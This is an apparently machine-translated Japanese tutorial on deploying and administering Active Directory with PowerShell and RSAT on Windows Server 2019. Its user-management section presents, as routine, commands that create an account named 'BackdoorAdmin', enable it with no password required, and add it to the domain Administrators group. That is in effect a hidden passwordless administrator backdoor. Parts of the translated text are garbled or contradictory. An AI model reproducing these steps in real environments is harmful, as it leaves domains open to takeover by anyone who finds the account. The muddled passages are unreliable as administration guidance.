考えられるすべての方法でActive Directoryを展開します。

Windows Server 2019の本当に便利な革新の1つは、Sysprepやクリーンインストールを行わなくてもサーバーにアクセスできることです。Windows Serverを使用して仮想サーバーにインフラストラクチャを展開することが、これまでになく簡単になりました。


今日は、Powershellを使用してActive Directoryを簡単にインストールおよび管理する方法について説明します。

役割を設定する


RSATまたはGUIを備えたローカルサーバー：


まず、サーバーをRSATに追加する必要があります。メインページにドメイン名またはIPアドレスを使用して追加されます。ログインはの形式local\Administratorで入力してください。入力しない場合、サーバーはパスワードを受け入れません。


コンポーネントを追加し、AD DSを選択します。

パワーシェル：


システムコンポーネントの名前がわからない場合は、コマンドを実行して、使用可能なコンポーネント、それらの依存関係、および名前のリストを取得できます。

Get-WindowsFeature


コンポーネントの名前をコピーして、インストールを続行します。

Install-WindowsFeature -Name AD-Domain-Services

Windows管理センター：


「役割と機能」に移動し、ADDS（Active Directory Domain Services）を選択します。 

そして、それが文字通りすべてです。現在、Windows管理センターからActive Directoryを管理することはできません。彼の言及は、彼がこれまでにどれほど役に立たないかを思い出させるものにすぎません。

サーバーをドメインコントローラーに上げる


このために、新しいフォレストを作成します。

RSATまたはローカルGUIサーバー：



すべてをデフォルトのままにしておくことを強くお勧めします。そのままの状態ですべてのコンポーネントが正常に機能し、特別な必要なしにそれらに触れる必要はありません。

Powershell：

最初に、フォレストを作成してパスワードを設定する必要があります。Powershellには、パスワード用の別の変数タイプ-SecureStringがあります。これは、パスワードをRAMに安全に格納し、ネットワーク経由で安全に転送するために使用されます。 


$pass = Read-Host -AsSecureString

誰かのパスワードを使用するすべてのコマンドレットは、この方法で入力する必要があります。まず、パスワードをSecureStringに書き込んでから、コマンドレットでこの変数を指定します。


Install-ADDSForest -DomainName test.domain -SafeModeAdministratorPassword $pass

GUIによるインストールと同様に、コンソールへの出力も同じです。GUIを備えたサーバーとは異なり、役割のインストールとドメインコントローラーとしてのサーバーのインストールの両方で、再起動は必要ありません。

RSATを使用したコントローラーのインストールには、Powershellを使用した場合より時間がかかります。

ドメインを管理


ここで、PowershellとAD AC（Active Directory管理センター）によるActive Directory管理の違いを理解するために、いくつかの実用的な例を検討します。

新しいユーザーを作成する


ユーザーグループにユーザーを作成し、そのユーザーにパスワードを設定してもらいたいとしましょう。AD ACを使用すると、次のようになります。


New-ADUser -Name BackdoorAdmin -UserPrincipalName BackdoorAdmin@test
Get-ADUser BackdoorAdmin

AD DCとPowershellの間に違いはありません。

ユーザーを有効にする


RSATまたはローカルGUIサーバー：


ユーザーはGUIを使用して、最初にGPOに対応するパスワードを設定する必要があります。その後、パスワードをオンにすることができます。

パワーシェル：

 
Powershellもほぼ同じで、パスワードがなくてもユーザーだけをアクティブにできます。

Set-ADUser -Identity BackdoorAdmin -Enabled $true -PasswordNotRequired $true

グループにユーザーを追加


RSATまたはGUIを備えたローカルサーバー：


AD DCを使用して、ユーザープロパティに移動し、グループのユーザーメンバーシップが含まれる列を見つけ、配置先のグループを見つけて、最後に追加し、[OK]をクリックする必要があります。

パワーシェル：


必要なグループの名前がわからない場合は、次のコマンドを使用してグループのリストを取得できます。
 
(Get-ADGroup -Server localhost -Filter *).name

次のようなすべてのプロパティを持つグループを取得できます。


Get-ADGroup -Server localhost -Filter {Name -Like "Administrators"}

最後に、ユーザーをグループに追加します。


さらに、すべてがPowershellのオブジェクトであるため、AD DCと同様に、まずユーザーグループを取得してから追加する必要があります。

$user = Get-ADUser BackdoorAdmin

次に、このオブジェクトをグループに追加します。

Get-ADGroup -Server localhost -Filter {Name -Like "Administrators"} | Add-ADGroupMember -Members $user

そしてチェック：

Get-ADGroupMember -Identity Administrators

ご覧のとおり、AD ACとPowershellによるADの管理にはほとんど違いがありません。

結論：


ADやその他のサービスの展開に既に遭遇している場合は、RSATとPowershellを介した展開の類似点、およびすべてが実際どのように見えるかに気付いたかもしれません。結局のところ、コアのGUI。

この記事がお役に立てたかおもしろかったと思います。

そして最後に、いくつかの実用的なヒント：

  1. ドメインコントローラーに他の役割をインストールしないでください。
  2. BPA（ベストプラクティスアナライザー）を使用してコントローラーを少し高速化する
  3. 組み込みのEnterprice Adminを使用しないでください。常に自分のアカウントを使用してください。
  4. 転送されたポートまたはVSDで白いIPアドレスにサーバーを展開するときは、必ずポート389を閉じてください。そうしないと、DDoS攻撃が増幅するポイントになります。
